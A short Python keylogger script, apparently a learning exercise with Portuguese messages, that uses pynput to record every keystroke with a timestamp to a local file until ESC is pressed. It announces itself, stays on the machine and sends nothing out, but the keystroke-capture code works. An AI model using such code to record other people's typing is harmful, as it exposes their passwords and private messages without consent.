from pynput import keyboard
import logging
from datetime import datetime

logging.basicConfig(
    filename="keylog.txt",
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

ignorar = [
    keyboard.Key.shift,
    keyboard.Key.ctrl,
    keyboard.Key.alt,
    keyboard.Key.cmd,
    keyboard.Key.caps_lock,
    keyboard.Key.tab
]

def on_press(key):
    if key in ignorar:
        return
    try:
        logging.info(f'Tecla pressionada: {key.char}')
    except AttributeError:
        logging.info(f'Tecla especial pressionada: {key}')

def on_release(key):
    if key == keyboard.Key.esc:
        logging.info("Keylogger finalizado pelo usuário.")
        return False

def main():
    print("Keylogger iniciado. Pressione ESC para parar.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()